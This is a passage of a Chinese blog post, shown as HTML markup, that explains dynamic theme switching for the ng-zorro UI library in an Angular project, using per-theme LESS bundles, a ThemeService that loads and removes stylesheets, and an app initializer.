class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br><span class="line-number">248</span><br><span class="line-number">249</span><br><span class="line-number">250</span><br><span class="line-number">251</span><br><span class="line-number">252</span><br><span class="line-number">253</span><br><span class="line-number">254</span><br><span class="line-number">255</span><br><span class="line-number">256</span><br><span class="line-number">257</span><br><span class="line-number">258</span><br><span class="line-number">259</span><br><span class="line-number">260</span><br><span class="line-number">261</span><br><span class="line-number">262</span><br><span class="line-number">263</span><br><span class="line-number">264</span><br><span class="line-number">265</span><br><span class="line-number">266</span><br><span class="line-number">267</span><br><span class="line-number">268</span><br><span class="line-number">269</span><br><span class="line-number">270</span><br><span class="line-number">271</span><br><span class="line-number">272</span><br><span class="line-number">273</span><br></div></div><p>大家看完可能会有疑问，上述触发主题的条件貌似是更改全局主题的主题标志，如果我想局部实现不同主题怎么办？接下来说的第三方ui主题换肤的方案可以解决这个问题。</p> <h3 id="第三方ui一键换肤"><a href="#第三方ui一键换肤" class="header-anchor">#</a> 第三方ui一键换肤</h3> <p>第三方UI库例如zorro一般都有提供一个样式变量列表，根据不同主题变量的设置就可以更改组件的整个主色调。事实上，任何组件库都有其遵循的色彩规范，这套色彩体系的是组件主题的基础。可以看下我另外一篇在公司演讲过的文章<a href="/vuebloger/technology/二次封装组件思考.html">二次封装组件思考</a>了解下色彩系统的构成元素。</p> <p>基于主题的一系列变量，我们可以打包编译出不同的主题，然后通过动态加载/移除主题的方式实现局部主题更换或者是更换整个第三方UI组件的主题。即：</p> <ol><li>开发前基于不同主题新建不同的主题文件（文件内通过样式变量覆盖或者自定义不同样式），angular.json指定打包这些目录提取不同主题（开发和打包一个在内存，一个在硬盘）</li> <li>创建服务，在项目初始化（例如不同赛道项目不同主题）或基于触发条件（例如点击加载不同主题页面）使用服务动态加载/移除主题文件</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular.json</span>
projects
   ky<span class="token operator">-</span>student <span class="token comment">// 项目名</span>
      architect
          build
             styles：<span class="token punctuation">[</span>
                 <span class="token string">&quot;node_modules/viewerjs/dist/viewer.min.css&quot;</span><span class="token punctuation">,</span>
                 <span class="token string">&quot;projects/ky-student/src/styles.less&quot;</span><span class="token punctuation">,</span>
                 <span class="token punctuation">{</span>
                   <span class="token string">&quot;input&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/themes/normal.less&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 👈 打包出normal主题(包含开发和构建)</span>
                   <span class="token string">&quot;bundleName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;normal&quot;</span><span class="token punctuation">,</span>
                   <span class="token string">&quot;inject&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
                 <span class="token punctuation">}</span><span class="token punctuation">,</span>
                 <span class="token punctuation">{</span>
                   <span class="token string">&quot;input&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projects/ky-student/src/themes/educational.less&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 👈 打包出educational主题(包含开发和构建)</span>
                   <span class="token string">&quot;bundleName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;educational&quot;</span><span class="token punctuation">,</span> <span class="token comment">//  默认是输出到根目录educational.css</span>
                   <span class="token string">&quot;inject&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
                 <span class="token punctuation">}</span>
               <span class="token punctuation">]</span><span class="token punctuation">,</span>
             scripts<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token comment">// normal.less</span>
@<span class="token keyword">import</span> <span class="token string">&quot;../../../../node_modules/ng-zorro-antd/ng-zorro-antd.less&quot;</span><span class="token punctuation">;</span>
@primary<span class="token operator">-</span>color<span class="token operator">:</span> #<span class="token number">00</span>AB84<span class="token punctuation">;</span> <span class="token comment">// 覆盖组件主色调用改更改第三方UI库主题</span>
app<span class="token operator">-</span>layout<span class="token operator">-</span>help<span class="token operator">-</span>center  <span class="token punctuation">{</span> <span class="token comment">// 添加主题特有样式</span>
  background<span class="token operator">:</span> #<span class="token number">00</span>AB84<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// educational.less</span>
@<span class="token keyword">import</span> <span class="token string">&quot;../../../../node_modules/ng-zorro-antd/ng-zorro-antd.less&quot;</span><span class="token punctuation">;</span>
@primary<span class="token operator">-</span>color<span class="token operator">:</span> #<span class="token constant">FF9900</span><span class="token punctuation">;</span> <span class="token comment">// 覆盖组件主色调用改更改第三方UI库主题</span>
app<span class="token operator">-</span>layout<span class="token operator">-</span>help<span class="token operator">-</span>center  <span class="token punctuation">{</span> <span class="token comment">// 添加主题特有样式</span>
  background<span class="token operator">:</span> #<span class="token constant">FF9900</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// theme.service.ts // 根据不同条件加载/移除不同主题</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ToolsUtil<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;../utils/tools.util&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">enum</span> ThemeType <span class="token punctuation">{</span>
  normal <span class="token operator">=</span> <span class="token string">'normal'</span><span class="token punctuation">,</span>
  educational <span class="token operator">=</span> <span class="token string">'educational'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> themeManager <span class="token operator">=</span> <span class="token punctuation">{</span>
  cjsd<span class="token operator">:</span> ThemeType<span class="token punctuation">.</span>normal<span class="token punctuation">,</span>
  zksd<span class="token operator">:</span> ThemeType<span class="token punctuation">.</span>educational
<span class="token punctuation">}</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ThemeService</span> <span class="token punctuation">{</span>
  currentTheme <span class="token operator">=</span> themeManager<span class="token punctuation">[</span>ToolsUtil<span class="token punctuation">.</span><span class="token function">getOrgCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'normal'</span>  👈 根据赛道参数设置主题标志
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">private</span> <span class="token function">reverseTheme</span><span class="token punctuation">(</span>theme<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> ThemeType <span class="token punctuation">{</span>
    <span class="token keyword">return</span> theme <span class="token operator">===</span> ThemeType<span class="token punctuation">.</span>educational <span class="token operator">?</span> ThemeType<span class="token punctuation">.</span>normal <span class="token operator">:</span> ThemeType<span class="token punctuation">.</span>educational<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">private</span> <span class="token function">removeUnusedTheme</span><span class="token punctuation">(</span>theme<span class="token operator">:</span> ThemeType<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>theme<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> removedThemeStyle <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>theme<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>removedThemeStyle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>removedThemeStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">private</span> <span class="token function">loadCss</span><span class="token punctuation">(</span>href<span class="token operator">:</span> string<span class="token punctuation">,</span> id<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>Event<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> style <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      style<span class="token punctuation">.</span>rel <span class="token operator">=</span> <span class="token string">'stylesheet'</span><span class="token punctuation">;</span>
      style<span class="token punctuation">.</span>href <span class="token operator">=</span> href<span class="token punctuation">;</span>
      style<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
      style<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">;</span>
      style<span class="token punctuation">.</span>onerror <span class="token operator">=</span> reject<span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">loadTheme</span><span class="token punctuation">(</span>firstLoad <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>Event<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> theme <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>currentTheme<span class="token punctuation">;</span> 👈 改变currentTheme加载映入外部主题
    <span class="token keyword">if</span> <span class="token punctuation">(</span>firstLoad<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>theme<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token operator">&lt;</span>Event<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadCss</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>theme<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.css</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> theme<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>firstLoad<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>theme<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeUnusedTheme</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">reverseTheme</span><span class="token punctuation">(</span>theme<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">resolve</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">reject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">toggleTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>Event<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>currentTheme <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">reverseTheme</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>currentTheme<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadTheme</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
下面演示根据不同赛道添加不同主题
*/</span>
<span class="token comment">//app-initializer.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">APP_INITIALIZER</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ThemeService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./theme.service&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> AppInitializerProvider <span class="token operator">=</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">,</span> 👈 使用该令牌angular应用会在初始化执行该内部逻辑
  <span class="token function-variable function">useFactory</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">themeService<span class="token operator">:</span> ThemeService</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> themeService<span class="token punctuation">.</span><span class="token function">loadTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 👈 加载主题
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  deps<span class="token operator">:</span> <span class="token punctuation">[</span>ThemeService<span class="token punctuation">]</span><span class="token punctuation">,</span>
  multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// app.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">APP_INITIALIZER</span><span class="token punctuation">,</span> NgModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserAnimationsModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AppComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AppRoutingModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app-routing.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>registerLocaleData<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> zh <span class="token keyword">from</span> <span class="token string">'@angular/common/locales/zh'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpClientModule<span class="token punctuation">,</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BaseInterceptor<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@student-main/app/core/interceptor/base.interceptor'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">NZ_I18N</span><span class="token punctuation">,</span> zh_CN<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd/i18n'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@student-main/app/core/services/http.service'</span><span class="token punctuation">;</span>
<span class="token comment">// #region Startup Service</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StyleService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./core/style/style.service&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ImgSetModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./core/img-set/img-set..module&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StyleSizeModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./core/style-size/style-size.module&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AppInitializerProvider<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./core/services/app-initializer.service&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">APPINIT_PROVIDES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  AppInitializerProvider<span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// #endregion</span>

<span class="token function">registerLocaleData</span><span class="token punctuation">(</span>zh<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">SERVICE_PROVIDES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  HttpService
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">HTTP_INTERCEPTION_PROVIDES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> BaseInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
    AppComponent<span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    BrowserAnimationsModule<span class="token punctuation">,</span>
    HttpClientModule<span class="token punctuation">,</span>
    AppRoutingModule<span class="token punctuation">,</span>
    ImgSetModule<span class="token punctuation">,</span>
    StyleSizeModule<span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">NZ_I18N</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> zh_CN<span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">HTTP_INTERCEPTION_PROVIDES</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">SERVICE_PROVIDES</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token constant">APPINIT_PROVIDES</span> 👈  丢到服务中初始化逻辑
    <span class="token comment">// { provide: LocationStrategy, useClass: PathLocationStrategy},</span>
    <span class="token comment">// {provide: APP_BASE_HREF, useValue: process.env.environment !== 'development' ? '/student/' : '/'},</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span 